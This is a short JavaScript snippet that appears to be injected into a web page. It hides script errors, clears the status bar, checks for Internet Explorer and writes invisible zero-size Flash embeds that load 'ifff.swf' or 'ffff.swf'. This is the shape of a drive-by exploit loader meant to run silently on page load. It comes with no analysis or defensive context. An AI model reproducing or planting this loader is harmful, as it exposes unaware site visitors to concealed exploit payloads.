<script>
window.onerror=function(){return true;}
document.writeln("<script>function init(){window.status=\"\";}window.onload = init;");
document.writeln("window.onerror=function(){return true;}");
document.writeln("");
document.writeln("if(navigator.userAgent.toLowerCase().indexOf(\"msie\")>0)");
document.writeln("{");
document.writeln("document.write(\'<object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http:\/\/download.macromedia.com\/pub\/shockwave\/cabs\/flash\/swflash.cab#version=4,0,19,0\" width=\"0\" height=\"0\" align=\"middle\">\');");
document.writeln("document.write(\'<param name=\"allowScriptAccess\" value=\"sameDomain\"\/>\');");
document.writeln("document.write(\'<param name=\"movie\" value=\"ifff.swf\"\/>\');");
document.writeln("document.write(\'<param name=\"quality\" value=\"high\"\/>\');");
document.writeln("document.write(\'<param name=\"bgcolor\" value=\"#ffffff\"\/>\');");
document.writeln("document.write(\'<embed src=\"ifff.swf\"\/>\');");
document.writeln("document.write(\'<\/object>\');");
document.writeln("}");
document.writeln("else{document.write(\'<EMBED src=\"ffff.swf\" width=0 height=0>\');}");
document.writeln("<\/script>")
</script>
